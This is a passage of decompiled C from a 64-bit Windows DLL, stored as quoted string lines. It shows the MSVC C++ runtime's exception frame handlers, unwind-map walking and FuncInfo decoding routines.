    "          return v3;",
    "        }",
    "      }",
    "    }",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001572C(",
    "        __int64 a1,",
    "        unsigned __int64 *a2,",
    "        __int64 a3,",
    "        struct _xDISPATCHER_CONTEXT *a4,",
    "        __int64 a5,",
    "        int a6,",
    "        __int64 a7,",
    "        unsigned __int8 a8)",
    "{",
    "  __int64 v12; // rcx",
    "  __int64 v13; // rax",
    "  __int64 v14; // r8",
    "  __int64 v15; // r9",
    "  __int64 v16; // rcx",
    "  __int64 v17; // rdx",
    "  int v18; // eax",
    "  __int64 v19; // r9",
    "  unsigned __int64 *v20; // rcx",
    "  __int64 (__fastcall *v21)(__int64, unsigned __int64 *, __int64, struct _xDISPATCHER_CONTEXT *, __int64, int, __int64, _DWORD); // r10",
    "",
    "  sub_180016DD4(a3);",
    "  v13 = sub_180013A9C(v12);",
    "  v16 = 2147483689LL;",
    "  v17 = 2147483686LL;",
    "  if ( *(_DWORD *)(v13 + 64) || *(_DWORD *)a1 == -529697949 )",
    "    goto LABEL_9;",
    "  if ( *(_DWORD *)a1 != -2147483607 )",
    "    goto LABEL_6;",
    "  if ( *(_DWORD *)(a1 + 24) == 15 )",
    "  {",
    "    if ( *(_QWORD *)(a1 + 96) == 429065504 )",
    "      goto LABEL_9;",
    "LABEL_6:",
    "    if ( *(_DWORD *)a1 == -2147483610 )",
    "      goto LABEL_9;",
    "  }",
    "  if ( (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930522 && (*(_BYTE *)(a5 + 36) & 1) != 0 )",
    "    return 1;",
    "LABEL_9:",
    "  if ( (*(_BYTE *)(a1 + 4) & 0x66) != 0 )",
    "  {",
    "    if ( !*(_DWORD *)(a5 + 4) || a6 )",
    "      return 1;",
    "    if ( (*(_BYTE *)(a1 + 4) & 0x20) != 0 )",
    "    {",
    "      if ( *(_DWORD *)a1 == -2147483610 )",
    "      {",
    "        v18 = sub_180013CE0(a5, (__int64)a4, a4->TargetIp, v15);",
    "        if ( v18 >= -1 && v18 < *(_DWORD *)(a5 + 4) )",
    "        {",
    "          v19 = (unsigned int)v18;",
    "          v20 = a2;",
    "LABEL_17:",
    "          sub_180016494(v20, a4, a5, v19);",
    "          return 1;",
    "        }",
    "        goto LABEL_37;",
    "      }",
    "      if ( *(_DWORD *)a1 == -2147483607 )",
    "      {",
    "        v19 = *(unsigned int *)(a1 + 56);",
    "        if ( (int)v19 >= -1 && (int)v19 < *(_DWORD *)(a5 + 4) )",
    "        {",
    "          v20 = *(unsigned __int64 **)(a1 + 40);",
    "          goto LABEL_17;",
    "        }",
    "LABEL_37:",
    "        sub_1800219B0(v16, v17, v14, v19);",
    "      }",
    "    }",
    "    sub_180012A28((__int64)a2, (__int64)a4, a5);",
    "    return 1;",
    "  }",
    "  if ( *(_DWORD *)(a5 + 12)",
    "    || (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930521 && *(_DWORD *)(a5 + 32) && *(int *)(a5 + 32) + sub_1800132CC()",
    "    || (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930522 && (*(_DWORD *)(a5 + 36) & 4) != 0 )",
    "  {",
    "    if ( *(_DWORD *)a1 == -529697949 && *(_DWORD *)(a1 + 24) >= 3u && *(_DWORD *)(a1 + 32) > 0x19930522u )",
    "    {",
    "      if ( *(_DWORD *)(*(_QWORD *)(a1 + 48) + 8LL) )",
    "      {",
    "        v21 = (__int64 (__fastcall *)(__int64, unsigned __int64 *, __int64, struct _xDISPATCHER_CONTEXT *, __int64, int, __int64, _DWORD))(*(int *)(*(_QWORD *)(a1 + 48) + 8LL) + sub_1800132E0());",
    "        if ( v21 )",
    "          return v21(a1, a2, a3, a4, a5, a6, a7, a8);",
    "      }",
    "    }",
    "    sub_180014568(a1, a2, a3, a4, (struct _s_FuncInfo *)a5, a8, a6, a7);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180015964(",
    "        __int64 a1,",
    "        __int64 *a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        __int64 a7,",
    "        unsigned __int8 a8)",
    "{",
    "  __int64 v12; // rcx",
    "  __int64 v13; // rax",
    "  int v14; // esi",
    "  __int64 v15; // r8",
    "  _BYTE *v16; // rdx",
    "  __int64 v17; // rax",
    "  __int64 v18; // rcx",
    "  _BYTE *v19; // rdx",
    "  int v20; // eax",
    "  __int64 v21; // r9",
    "  _BYTE *v22; // rdx",
    "  __int64 v23; // rax",
    "  __int64 *v24; // rcx",
    "  _BYTE *v25; // rdx",
    "  __int64 v26; // rax",
    "  __int64 (__fastcall *v27)(__int64, __int64 *, __int64, __int64, __int64, int, __int64, _DWORD); // r10",
    "  _DWORD v29[12]; // [rsp+50h] [rbp-48h] BYREF",
    "",
    "  sub_180016DD4(a3);",
    "  v13 = sub_180013A9C(v12);",
    "  v14 = 0;",
    "  v15 = 2147483689LL;",
    "  if ( !*(_DWORD *)(v13 + 64) && *(_DWORD *)a1 != -529697949 )",
    "  {",
    "    if ( *(_DWORD *)a1 != -2147483607 )",
    "      goto LABEL_6;",
    "    if ( *(_DWORD *)(a1 + 24) != 15 )",
    "      goto LABEL_7;",
    "    if ( *(_QWORD *)(a1 + 96) != 429065504 )",
    "    {",
    "LABEL_6:",
    "      if ( *(_DWORD *)a1 != -2147483610 )",
    "      {",
    "LABEL_7:",
    "        if ( (*(_BYTE *)a5 & 0x20) != 0 )",
    "          return 1;",
    "      }",
    "    }",
    "  }",
    "  if ( (*(_BYTE *)(a1 + 4) & 0x66) != 0 )",
    "  {",
    "    if ( !*(_DWORD *)(a5 + 8) )",
    "      return 1;",
    "    v16 = (_BYTE *)(*(_QWORD *)(a4 + 8) + *(int *)(a5 + 8));",
    "    v18 = *v16 & 0xF;",
    "    v17 = byte_18003AB58[v18];",
    "    LOBYTE(v18) = byte_18003AB58[v18 + 16];",
    "    v19 = &v16[-v17];",
    "    if ( !(*((_DWORD *)v19 - 1) >> v18) || a6 )",
    "      return 1;",
    "    if ( (*(_BYTE *)(a1 + 4) & 0x20) != 0 )",
    "    {",
    "      if ( *(_DWORD *)a1 == -2147483610 )",
    "      {",
    "        v20 = sub_180013D48(a5, a4, *(_QWORD *)(a4 + 32));",
    "        v21 = (unsigned int)v20;",
    "        if ( v20 >= -1 )",
    "        {",
    "          if ( *(_DWORD *)(a5 + 8) )",
    "          {",
    "            v22 = (_BYTE *)(*(_QWORD *)(a4 + 8) + *(int *)(a5 + 8));",
    "            v18 = *v22 & 0xF;",
    "            v23 = byte_18003AB58[v18];",
    "            LOBYTE(v18) = byte_18003AB58[v18 + 16];",
    "            v19 = &v22[-v23];",
    "            v14 = *((_DWORD *)v19 - 1) >> v18;",
    "          }",
    "          if ( (int)v21 < v14 )",
    "          {",
    "            v24 = a2;",
    "LABEL_19:",
    "            sub_180016620(v24, a4, a5, v21);",
    "            return 1;",
    "          }",
    "        }",
    "        goto LABEL_35;",
    "      }",
    "      if ( *(_DWORD *)a1 == -2147483607 )",
    "      {",
    "        v21 = *(unsigned int *)(a1 + 56);",
    "        if ( (int)v21 >= -1 )",
    "        {",
    "          v25 = (_BYTE *)(*(_QWORD *)(a4 + 8) + *(int *)(a5 + 8));",
    "          v18 = *v25 & 0xF;",
    "          v26 = byte_18003AB58[v18];",
    "          LOBYTE(v18) = byte_18003AB58[v18 + 16];",
    "          v19 = &v25[-v26];",
    "          if ( (int)v21 < *((_DWORD *)v19 - 1) >> v18 )",
    "          {",
    "            v24 = *(__int64 **)(a1 + 40);",
    "            goto LABEL_19;",
    "          }",
    "        }",
    "LABEL_35:",
    "        sub_1800219B0(v18, v19, v15, v21);",
    "      }",
    "    }",
    "    sub_180012A8C(a2, a4, a5);",
    "    return 1;",
    "  }",
    "  sub_180015CD0(v29, a5, *(_QWORD *)(a4 + 8));",
    "  if ( v29[0] || (*(_BYTE *)a5 & 0x40) != 0 )",
    "  {",
    "    if ( *(_DWORD *)a1 == -529697949 && *(_DWORD *)(a1 + 24) >= 3u && *(_DWORD *)(a1 + 32) > 0x19930522u )",
    "    {",
    "      if ( *(_DWORD *)(*(_QWORD *)(a1 + 48) + 8LL) )",
    "      {",
    "        v27 = (__int64 (__fastcall *)(__int64, __int64 *, __int64, __int64, __int64, int, __int64, _DWORD))(*(int *)(*(_QWORD *)(a1 + 48) + 8LL) + sub_1800132E0());",
    "        if ( v27 )",
    "          return v27(a1, a2, a3, a4, a5, a6, a7, a8);",
    "      }",
    "    }",
    "    sub_180014A38(a1, (void **)a2, a3, a4, a5, a8, a6, a7);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "__int64 __fastcall sub_180015BF8(",
    "        __int64 a1,",
    "        unsigned __int64 *a2,",
    "        __int64 a3,",
    "        struct _xDISPATCHER_CONTEXT *a4,",
    "        __int64 a5,",
    "        int a6,",
    "        __int64 a7,",
    "        unsigned __int8 a8)",
    "{",
    "}__int64 __fastcall sub_180015C00(",
    "        __int64 a1,",
    "        __int64 *a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        __int64 a7,",
    "        unsigned __int8 a8)",
    "{",
    "  unsigned int v8; // ebx",
    "  __int64 v9; // rcx",
    "",
    "  v8 = sub_180015964(a1, a2, a3, a4, a5, a6, a7, a8);",
    "  *(_DWORD *)(sub_180013A9C(v9) + 120) = -2;",
    "  return v8;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180015C4C(__int64 a1, __int64 a2, __int64 a3, int a4)",
    "{",
    "  _BYTE *v5; // rdx",
    "  __int64 v6; // rcx",
    "  _BYTE *v7; // rdx",
    "",
    "  *(_QWORD *)(a1 + 8) = 0;",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_BYTE *)(a1 + 24) = 0;",
    "  *(_QWORD *)(a1 + 28) = 0;",
    "  *(_QWORD *)(a1 + 36) = 0;",
    "  *(_OWORD *)(a1 + 48) = 0;",
    "  *(_QWORD *)(a1 + 64) = a3;",
    "  *(_DWORD *)(a1 + 72) = a4;",
    "  if ( *(_DWORD *)(a2 + 12) )",
    "  {",
    "    v5 = (_BYTE *)(a3 + *(int *)(a2 + 12));",
    "    *(_QWORD *)(a1 + 8) = v5;",
    "    v6 = *v5 & 0xF;",
    "    v7 = &v5[-byte_18003AB58[v6]];",
    "    *(_DWORD *)a1 = *((_DWORD *)v7 - 1) >> byte_18003AB58[v6 + 16];",
    "    *(_QWORD *)(a1 + 8) = v7;",
    "    *(_QWORD *)(a1 + 16) = v7;",
    "    sub_18001624C(a1);",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)a1 = 0;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180015CD0(__int64 a1, __int64 a2, __int64 a3)",
    "{",
    "  _BYTE *v4; // rdx",
    "  __int64 v5; // rcx",
    "  _BYTE *v6; // rdx",
    "  int v7; // eax",
    "  __int64 v8; // rcx",
    "  _BYTE *v9; // rdx",
    "  int v10; // eax",
    "  __int64 v11; // rcx",
    "  _BYTE *v12; // rdx",
    "  int v13; // eax",
    "  __int64 v14; // rcx",
    "  _DWORD *v15; // rdx",
    "",
    "  *(_QWORD *)(a1 + 8) = 0;",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_OWORD *)(a1 + 24) = 0;",
    "  if ( *(_DWORD *)(a2 + 12) )",
    "  {",
    "    v4 = (_BYTE *)(a3 + *(int *)(a2 + 12));",
    "    *(_QWORD *)(a1 + 8) = v4;",
    "    v5 = *v4 & 0xF;",
    "    v6 = &v4[-byte_18003AB58[v5]];",
    "    v7 = *((_DWORD *)v6 - 1) >> byte_18003AB58[v5 + 16];",
    "    *(_QWORD *)(a1 + 8) = v6;",
    "    *(_DWORD *)a1 = v7;",
    "    *(_QWORD *)(a1 + 16) = v6;",
    "    v8 = *v6 & 0xF;",
    "    v9 = &v6[-byte_18003AB58[v8]];",
    "    v10 = *((_DWORD *)v9 - 1) >> byte_18003AB58[v8 + 16];",
    "    *(_QWORD *)(a1 + 8) = v9;",
    "    *(_DWORD *)(a1 + 24) = v10;",
    "    v11 = *v9 & 0xF;",
    "    v12 = &v9[-byte_18003AB58[v11]];",
    "    v13 = *((_DWORD *)v12 - 1) >> byte_18003AB58[v11 + 16];",
    "    *(_QWORD *)(a1 + 8) = v12;",
    "    *(_DWORD *)(a1 + 28) = v13;",
    "    v14 = *v12 & 0xF;",
    "    v15 = &v12[-byte_18003AB58[v14]];",
    "    *(_DWORD *)(a1 + 32) = *(v15 - 1) >> byte_18003AB58[v14 + 16];",
    "    *(_QWORD *)(a1 + 8) = v15;",
    "    LODWORD(v14) = *v15;",
    "    *(_QWORD *)(a1 + 8) = v15 + 1;",
    "    *(_DWORD *)(a1 + 36) = v14;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)a1 = 0;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180015DB4(__int64 a1, __int64 a2)",
    "{",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8((__int64 *)(a2 + 8), a1 + 8);",
    "  *(_QWORD *)a1 = &off_18003ACC8;",
    "  return a1;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180015DF0(_QWORD *a1)",
    "{",
    "  a1[2] = 0;",
    "  a1[1] = \"bad exception\";",
    "  *a1 = &off_18003ACC8;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180015E10(_QWORD *a1)",
    "{",
    "  __int64 v2; // r13",
    "  __int64 v3; // rcx",
    "  __int64 v4; // rsi",
    "  __int64 v5; // rbx",
    "  _QWORD *v6; // r14",
    "  __int64 v7; // rcx",
    "  __int64 v8; // rcx",
    "  __int64 v9; // rcx",
    "  __int64 v10; // rax",
    "  __int64 v11; // rcx",
    "  _QWORD *v12; // r12",
    "  __int64 v13; // rbx",
    "  __int64 v14; // rcx",
    "  __int64 v15; // rcx",
    "  __int64 v17; // [rsp+30h] [rbp-78h]",
    "  __int64 v18; // [rsp+48h] [rbp-60h]",
    "  _QWORD v19[9]; // [rsp+60h] [rbp-48h] BYREF",
    "  __int64 v20; // [rsp+C0h] [rbp+18h]",
    "",
    "  v2 = *(_QWORD *)(sub_180013A9C((__int64)a1) + 40);",
    "  v20 = *(_QWORD *)(sub_180013A9C(v3) + 32);",
    "  v4 = a1[10];",
    "  v17 = a1[9];",
    "  v5 = a1[8];",
    "  v18 = a1[6];",
    "  v6 = (_QWORD *)a1[5];",
    "  sub_180016DD4(v5);",
    "  *(_QWORD *)(sub_180013A9C(v7) + 32) = v4;",
    "  *(_QWORD *)(sub_180013A9C(v8) + 40) = v5;",
    "  v10 = sub_180013A9C(v9);",
    "  v12 = sub_18001323C(v19, *(_QWORD *)(*(_QWORD *)(v10 + 32) + 40LL));",
    "  if ( a1[11] )",
    "    sub_180013A9C(v11);",
    "  v13 = CallSettingFrame(v18, v6, 256);",
    "  sub_180013278((__int64)v12);",
    "  if ( *(_DWORD *)v4 == -529697949",
    "    && *(_DWORD *)(v4 + 24) == 4",
    "    && (unsigned int)(*(_DWORD *)(v4 + 32) - 429065504) <= 2",
    "    && (unsigned int)sub_1800134E0(*(_QWORD *)(v4 + 40)) )",
    "  {",
    "    sub_18001346C(v4);",
    "  }",
    "  *(_QWORD *)(sub_180013A9C(v14) + 32) = v20;",
    "  *(_QWORD *)(sub_180013A9C(v15) + 40) = v2;",
    "  *(_QWORD *)(*(int *)(v17 + 28) + *v6) = -2;",
    "  return v13;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180015FFC(__int64 a1)",
    "{",
    "  __int64 v2; // rcx",
    "  __int64 v3; // rsi",
    "  __int64 v4; // rbx",
    "  __int64 v5; // r15",
    "  __int64 v6; // rcx",
    "  __int64 v7; // rcx",
    "  __int64 v8; // rcx",
    "  __int64 v9; // rax",
    "  __int64 v10; // rcx",
    "  _QWORD *v11; // r13",
    "  __int64 v12; // rax",
    "  __int64 v13; // rdx",
    "  __int64 v14; // rcx",
    "  __int64 v15; // r8",
    "  __int64 v16; // r9",
    "  __int64 v17; // rbx",
    "  __int64 v18; // rcx",
    "  __int64 v19; // rcx",
    "  __int64 v20; // rcx",
    "  __int64 v22; // [rsp+30h] [rbp-98h]",
    "  __int64 v23; // [rsp+38h] [rbp-90h]",
    "  __int64 v24; // [rsp+50h] [rbp-78h] BYREF",
    "  int v25; // [rsp+58h] [rbp-70h]",
    "  int v26; // [rsp+5Ch] [rbp-6Ch]",
    "  int v27; // [rsp+60h] [rbp-68h]",
    "  int v28; // [rsp+64h] [rbp-64h]",
    "  __int64 v29; // [rsp+68h] [rbp-60h]",
    "  _QWORD v30[11]; // [rsp+70h] [rbp-58h]",
    "  unsigned int v31; // [rsp+D0h] [rbp+8h]",
    "",
    "  LOBYTE(v24) = 0;",
    "  HIDWORD(v24) = 0;",
    "  v25 = 0;",
    "  v26 = 0;",
    "  v27 = 0;",
    "  v28 = 0;",
    "  v23 = *(_QWORD *)(sub_180013A9C(a1) + 40);",
    "  v22 = *(_QWORD *)(sub_180013A9C(v2) + 32);",
    "  v3 = *(_QWORD *)(a1 + 80);",
    "  v4 = *(_QWORD *)(a1 + 64);",
    "  v29 = *(_QWORD *)(a1 + 48);",
    "  v5 = *(_QWORD *)(a1 + 40);",
    "  v30[0] = *(_QWORD *)(a1 + 72);",
    "  v30[1] = *(_QWORD *)(a1 + 104);",
    "  v31 = *(_DWORD *)(a1 + 56);",
    "  sub_180016DD4(v4);",
    "  *(_QWORD *)(sub_180013A9C(v6) + 32) = v3;",
    "  *(_QWORD *)(sub_180013A9C(v7) + 40) = v4;",
    "  v9 = sub_180013A9C(v8);",
    "  v11 = sub_18001323C(&v24, *(_QWORD *)(*(_QWORD *)(v9 + 32) + 40LL));",
    "  if ( *(_QWORD *)(a1 + 88) )",
    "    sub_180013A9C(v10);",
    "  v12 = CallSettingFrame_0(v29, v5, 256);",
    "  v17 = v12;",
    "  if ( v12 < 2 )",
    "  {",
    "    v17 = v30[v12];",
    "    if ( !v17 )",
    "      sub_1800219B0(v14, v13, v15, v16);",
    "  }",
    "  sub_180017220(v17, v5);",
    "  sub_180013278((__int64)v11);",
    "  if ( *(_DWORD *)v3 == -529697949",
    "    && *(_DWORD *)(v3 + 24) == 4",
    "    && (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) <= 2",
    "    && (unsigned int)sub_1800134E0(*(_QWORD *)(v3 + 40)) )",
    "  {",
    "    sub_18001346C(v3);",
    "  }",
    "  *(_QWORD *)(sub_180013A9C(v18) + 32) = v22;",
    "  *(_QWORD *)(sub_180013A9C(v19) + 40) = v23;",
    "  *(_DWORD *)(sub_180013A9C(v20) + 120) = v31;",
    "  *(_DWORD *)(sub_180013A9C(v31) + 120) = -2;",
    "  return v17;",
    "}",
    "",
    "",
    "char __fastcall sub_18001624C(__int64 a1)",
    "{",
    "  char *v2; // rax",
    "  char v3; // r9",
    "  _BYTE *v4; // rdx",
    "  __int64 v5; // rcx",
    "  int v6; // eax",
    "  __int64 v7; // rcx",
    "  int *v8; // r10",
    "  __int64 v9; // rax",
    "  __int64 v10; // rcx",
    "  __int64 v11; // rcx",
    "  __int64 v12; // rcx",
    "  char *v13; // r10",
    "  int v14; // edx",
    "  __int64 v15; // rcx",
    "  _BYTE *v16; // r10",
    "  int v17; // eax",
    "  __int64 v18; // rcx",
    "  _BYTE *v19; // r10",
    "",
    "  *(_BYTE *)(a1 + 24) = 0;",
    "  *(_QWORD *)(a1 + 28) = 0;",
    "  *(_QWORD *)(a1 + 36) = 0;",
    "  *(_OWORD *)(a1 + 48) = 0;",
    "  v2 = *(char **)(a1 + 8);",
    "  v3 = *v2;",
    "  v4 = v2 + 1;",
    "  *(_BYTE *)(a1 + 24) = *v2;",
    "  *(_QWORD *)(a1 + 8) = v2 + 1;",
    "  if ( (v3 & 1) != 0 )",
    "  {",
    "    v5 = *v4 & 0xF;",
    "    v4 -= byte_18003AB58[v5];",
    "    *(_DWORD *)(a1 + 28) = *((_DWORD *)v4 - 1) >> byte_18003AB58[v5 + 16];",
    "    *(_QWORD *)(a1 + 8) = v4;",
    "  }",
    "  if ( (v3 & 2) != 0 )",
    "  {",
    "    v6 = *(_DWORD *)v4;",
    "    v4 += 4;",
    "    *(_QWORD *)(a1 + 8) = v4;",
    "    *(_DWORD *)(a1 + 32) = v6;",
    "  }",
    "  if ( (v3 & 4) != 0 )",
    "  {",
    "    v7 = *v4 & 0xF;",
    "    v4 -= byte_18003AB58[v7];",
    "    *(_DWORD *)(a1 + 36) = *((_DWORD *)v4 - 1) >> byte_18003AB58[v7 + 16];",
    "    *(_QWORD *)(a1 + 8) = v4;",
    "  }",
    "  v8 = (int *)(v4 + 4);",
    "  *(_DWORD *)(a1 + 40) = *(_DWORD *)v4;",
    "  *(_QWORD *)(a1 + 8) = v4 + 4;",
    "  LOBYTE(v9) = v3 & 0x30;",
    "  if ( (v3 & 8) == 0 )",
    "  {",
    "    if ( (_BYTE)v9 == 16 )",
    "    {",
    "      v12 = *(_BYTE *)v8 & 0xF;",
    "      v13 = (char *)v8 - byte_18003AB58[v12];",
    "      v9 = (unsigned int)((*((_DWORD *)v13 - 1) >> byte_18003AB58[v12 + 16]) + *(_DWORD *)(a1 + 72));",
    "      *(_QWORD *)(a1 + 8) = v13;",
    "      *(_QWORD *)(a1 + 48) = v9;",
    "      return v9;",
    "    }",
    "    if ( (v3 & 0x30) != 0x20 )",
    "      return v9;",
    "    v14 = *(_DWORD *)(a1 + 72);",
    "    v15 = *(_BYTE *)v8 & 0xF;",
    "    v16 = (char *)v8 - byte_18003AB58[v15];",
    "    v17 = *((_DWORD *)v16 - 1) >> byte_18003AB58[v15 + 16];",
    "    *(_QWORD *)(a1 + 8) = v16;",
    "    *(_QWORD *)(a1 + 48) = (unsigned int)(v14 + v17);",
    "    v18 = *v16 & 0xF;",
    "    v19 = &v16[-byte_18003AB58[v18]];",
    "    LODWORD(v9) = *((_DWORD *)v19 - 1) >> byte_18003AB58[v18 + 16];",
    "    *(_QWORD *)(a1 + 8) = v19;",
    "    v11 = (unsigned int)(v14 + v9);",
    "    goto LABEL_16;",
    "  }",
    "  if ( (_BYTE)v9 != 16 )",
    "  {",
    "    if ( (v3 & 0x30) != 0x20 )",
    "      return v9;",
    "    v9 = *v8;",
    "    *(_QWORD *)(a1 + 8) = v4 + 8;",
    "    *(_QWORD *)(a1 + 48) = v9;",
    "    LOBYTE(v9) = (_BYTE)v4 + 12;",
    "    v11 = *((int *)v4 + 2);",
    "    *(_QWORD *)(a1 + 8) = v4 + 12;",
    "LABEL_16:",
    "    *(_QWORD *)(a1 + 56) = v11;",
    "    return v9;",
    "  }",
    "  v10 = *v8;",
    "  LOBYTE(v9) = (_BYTE)v4 + 8;",
    "  *(_QWORD *)(a1 + 8) = v4 + 8;",
    "  *(_QWORD *)(a1 + 48) = v10;",
    "  return v9;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800163E0(__int64 *a1, __int64 a2, _DWORD *a3)",
    "{",
    "  __int64 v3; // r9",
    "  __int64 v5; // rcx",
    "  __int64 result; // rax",
    "",
    "  v3 = *a1;",
    "  *a3 = 0;",
    "  if ( *(_DWORD *)v3 != -529697949 )",
    "    return 0;",
    "  if ( *(_DWORD *)(v3 + 24) == 4",
    "    && (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) <= 2",
    "    && *(_QWORD *)(v3 + 40) == *(_QWORD *)(a2 + 40) )",
    "  {",
    "    *a3 = 1;",
    "  }",
    "  if ( *(_DWORD *)v3 != -529697949 )",
    "    return 0;",
    "  if ( *(_DWORD *)(v3 + 24) != 4 )",
    "    return 0;",
    "  v5 = (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504);",
    "  if ( (unsigned int)v5 > 2 || *(_QWORD *)(v3 + 48) )",
    "    return 0;",
    "  *(_DWORD *)(sub_180013A9C(v5) + 64) = 1;",
    "  result = 1;",
    "  *a3 = 1;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180016464(__int64 *a1, __int64 a2, int a3, _DWORD *a4)",
    "{",
    "  __int64 v5; // rcx",
    "  unsigned int v6; // ebx",
    "",
    "  v6 = sub_1800163E0(a1, a2, a4);",
    "  if ( !v6 )",
    "    *(_DWORD *)(sub_180013A9C(v5) + 120) = a3;",
    "  return v6;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180016494(_QWORD *a1, _QWORD *a2, __int64 a3, int a4)",
    "{",
    "  __int64 v8; // r13",
    "  int v9; // edi",
    "  __int64 v10; // rcx",
    "  __int64 v11; // rax",
    "  __int64 v12; // rdx",
    "  __int64 v13; // rcx",
    "  __int64 v14; // r8",
    "  __int64 v15; // r9",
    "  __int64 v16; // r14",
    "  __int64 v17; // rax",
    "  __int64 v18; // rbx",
    "  __int64 v19; // rax",
    "  __int64 v20; // rbx",
    "  __int64 v21; // rax",
    "  __int64 v22; // rdx",
    "  __int64 v23; // rcx",
    "  __int64 v24; // r8",
    "  __int64 v25; // r9",
    "  __int64 v26; // rax",
    "",
    "  v8 = sub_1800132CC();",
    "  v9 = sub_180013C34(a1, a2, a3);",
    "  v11 = sub_180013A9C(v10);",
    "  ++*(_DWORD *)(v11 + 48);",
    "  while ( v9 != -1 && v9 > a4 )",
    "  {",
    "    if ( v9 <= -1 || v9 >= *(_DWORD *)(a3 + 4) )",
    "      sub_1800219B0(v13, v12, v14, v15);",
    "    v16 = v9;",
    "    v9 = *(_DWORD *)(*(int *)(a3 + 8) + sub_1800132CC() + 8LL * v9);",
    "    v17 = sub_1800132CC();",
    "    v13 = *(int *)(a3 + 8);",
    "    if ( *(_DWORD *)(v13 + v17 + 8 * v16 + 4) )",
    "    {",
    "      v18 = *(int *)(*(int *)(a3 + 8) + sub_1800132CC() + 8 * v16 + 4);",
    "      v19 = v18 + sub_1800132CC();",
    "    }",
    "    else",
    "    {",
    "      v19 = 0;",
    "    }",
    "    if ( v19 )",
    "    {",
    "      sub_180013C88(a1, a3, (unsigned int)v9);",
    "      if ( *(_DWORD *)(*(int *)(a3 + 8) + sub_1800132CC() + 8 * v16 + 4) )",
    "      {",
    "        v20 = *(int *)(*(int *)(a3 + 8) + sub_1800132CC() + 8 * v16 + 4);",
    "        v21 = v20 + sub_1800132CC();",
    "      }",
    "      else",
    "      {",
    "        v21 = 0;",
    "      }",
    "      CallSettingFrame(v21, a1, 259);",
    "      sub_1800132F4(v8);",
    "    }",
    "  }",
    "  if ( *(int *)(sub_180013A9C(v13) + 48) > 0 )",
    "  {",
    "    v26 = sub_180013A9C(v23);",
    "    --*(_DWORD *)(v26 + 48);",
    "  }",
    "  if ( v9 != -1 && v9 > a4 )",
    "    sub_1800219B0(v23, v22, v24, v25);",
    "  return sub_180013C88(a1, a3, (unsigned int)v9);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180016620(_QWORD *a1, __int64 a2, __int64 a3, int a4)",
    "{",
    "  __int64 v8; // rcx",
    "  int v9; // edi",
    "  _DWORD *v10; // r14",
    "  __int64 v11; // rdx",
    "  __int64 v12; // rcx",
    "  __int64 v13; // r8",
    "  __int64 v14; // r9",
    "  __int64 v15; // rcx",
    "  __int64 v16; // rax",
    "  _QWORD *v17; // rsi",
    "  _BYTE *v18; // rdx",
    "  _BYTE *v19; // rdx",
    "  __int64 v20; // rcx",
    "  __int64 v21; // rcx",
    "  __int64 v22; // r15",
    "  __int64 v23; // rbx",
    "  __m128i v24; // xmm6",
    "  int v25; // r9d",
    "  int v26; // eax",
    "  __int64 v27; // rdx",
    "  __m128i v28; // xmm6",
    "  __int64 v29; // r8",
    "  __int64 result; // rax",
    "  __int64 v31; // rcx",
    "  __int128 v32; // [rsp+30h] [rbp-108h] BYREF",
    "  int v33; // [rsp+40h] [rbp-F8h]",
    "  int v34; // [rsp+44h] [rbp-F4h]",
    "  int v35; // [rsp+48h] [rbp-F0h]",
    "  int *v36; // [rsp+50h] [rbp-E8h] BYREF",
    "  _BYTE *v37; // [rsp+58h] [rbp-E0h]",
    "  __int64 *v38; // [rsp+60h] [rbp-D8h]",
    "  __int64 v39; // [rsp+68h] [rbp-D0h]",
    "  _QWORD *v40; // [rsp+70h] [rbp-C8h]",
    "  __int64 v41; // [rsp+78h] [rbp-C0h]",
    "  _QWORD *v42; // [rsp+80h] [rbp-B8h]",
    "  int *v43; // [rsp+88h] [rbp-B0h]",
    "  _BYTE *v44; // [rsp+90h] [rbp-A8h]",
    "  __int128 v45; // [rsp+A0h] [rbp-98h] BYREF",
    "  __m128i v46; // [rsp+B0h] [rbp-88h]",
    "  int v47; // [rsp+C0h] [rbp-78h] BYREF",
    "  _BYTE *v48; // [rsp+C8h] [rbp-70h]",
    "  __int128 v49; // [rsp+D0h] [rbp-68h]",
    "",
    "  v42 = a1;",
    "  v38 = a1;",
    "  v35 = a4;",
    "  v39 = sub_1800132CC();",
    "  v9 = sub_180013CD8(a3, a2);",
    "  v10 = (_DWORD *)(a2 + 72);",
    "  v41 = a2 + 72;",
    "  if ( *(_DWORD *)(a2 + 72) )",
    "  {",
    "    if ( *(_DWORD *)(sub_180013A9C(v8) + 120) != -2 )",
    "      sub_1800219B0(v12, v11, v13, v14);",
    "    v9 = *v10 - 2;",
    "  }",
    "  else if ( *(_DWORD *)(sub_180013A9C(v8) + 120) != -2 )",
    "  {",
    "    v9 = *(_DWORD *)(sub_180013A9C(v12) + 120);",
    "    *(_DWORD *)(sub_180013A9C(v15) + 120) = -2;",
    "  }",
    "  v16 = sub_180013A9C(v12);",
